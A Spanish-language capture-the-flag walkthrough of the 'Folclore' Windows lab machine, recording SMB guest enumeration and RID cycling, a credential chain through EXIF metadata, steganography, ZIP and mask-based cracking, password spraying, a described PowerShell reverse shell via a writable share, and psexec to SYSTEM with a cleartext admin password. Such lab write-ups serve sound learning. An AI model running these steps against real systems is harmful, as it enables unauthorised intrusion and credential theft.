---
tags: [ctf, thehackerslabs, windows, walkthrough, smb]
tipo: walkthrough
estado: resuelto
---

# Folclore — Walkthrough

> [!note] Documento de detalle
> El **walkthrough completo** está en [[Folclore - Roadmap]]. Aquí se resumen los pasos con su interpretación.

## Paso 0 — Diagnóstico de NIC

**Comando**
```bash
VBoxManage modifyvm "The Hackers Labs - Folclore" --nic1 hostonly --hostonlyadapter1 vboxnet0 --cableconnected1 on
```

**Interpretación / por qué**
- La VM tenía la NIC en `NatNetwork` (inexistente) → sin conectividad. Pasarla a host-only lo resuelve.

## Paso 1 — Reconocimiento SMB

**Comando**
```bash
nmap -sV -p139,445,7680 192.168.56.105
netexec smb 192.168.56.105 -u guest -p '' --rid-brute
netexec smb 192.168.56.105 -u guest -p '' --shares
```

**Interpretación / por qué**
- SMB con signing **no requerido**; sesión guest activa.
- **RID cycling** enumera usuarios: Quetzalcoatl, El_charro_negro, Ix_Chel, Tlaloc, La_mulata_de_Cordoba, La_Catrina.
- Seis shares temáticos: `Oro, Libertad, Lluvia, Viento, "Dia de Muertos", Santuario`.

## Paso 2 — Cadena de credenciales

**Pasos clave**
```bash
# 1. rockyou -> El_charro_negro:abc123  (EXPIRADA)
# 2. EXIF de Oro/El_Charro_Negro.jpeg
exiftool El_Charro_Negro.jpeg          # -> Ix_Chel:4+9Ii1wK
# 3. Santuario/La clave de Kukulcán.txt  -> Tlaloc:677Kn$q
# 4. stegseek Lluvia/Tlaloc.jpg rockyou.txt   (passphrase "knight") -> 45yD#k7
# 5. spraying dirigido -> La_mulata_de_Cordoba:45yD#k7
# 6. Libertad/Mi_amiga.txt + Pacto.zip
zip2john Pacto.zip > pacto.hash && john --wordlist=rockyou.txt pacto.hash   # celina
#    -> La_Catrina:3nM93{S#
# 7. "Dia de Muertos"/Ultimo_mensaje.txt -> pista de patrón U + %/
hashcat -a 3 --stdout 'J9c?u?l?d?l?d%/'-like-mask > wordlist
#    -> Quetzalcoatl:J9c7U7%/   (USER)
```

**Interpretación / por qué**
- Cada share da el siguiente eslabón: metadatos, esteganografía, texto, ZIP. El **patrón conocido** permite construir la wordlist exacta.

## Paso 3 — USER (share Viento → reverse shell)

**Comando (concepto)**
```bash
# Subir un .ps1 al share "Viento"; una tarea programada lo ejecuta UNA vez
# -> reverse shell PowerShell como Quetzalcoatl
```

**Interpretación / por qué**
- Share escribible + tarea programada que ejecuta `.ps1` = ejecución de código.

## Paso 4 — ROOT

**Comando**
```bash
# C:\Users\Quetzalcoatl\Downloads\Actualizacion\Venganza.txt -> WwU@49F*
impacket-psexec Folclore/Administrador:'WwU@49F*'@192.168.56.105
```

**Salida relevante**
```text
nt authority\system
```

**Interpretación / por qué**
- La contraseña del Administrador está **en claro** en el perfil → `psexec` da **SYSTEM**.

## Qué funcionó

- RID cycling + cadena de shares.
- `stegseek`, EXIF y crackeo de ZIP.
- Wordlist por patrón.
- `psexec` con credenciales en claro.

## Qué falló (y por qué)

- Cambio de contraseña **expirada por SMB**: en 19041 el servidor elimina la sesión (`STATUS_USER_SESSION_DELETED`) y el pipe `samr` da `ACCESS_DENIED`; se hace por GUI/consola.

## Qué aprendí

- Interpretar `STATUS_PASSWORD_EXPIRED` (la contraseña es correcta pero debe cambiarse).
- Encadenar EXIF → steganografía → spraying → ZIP → patrón.
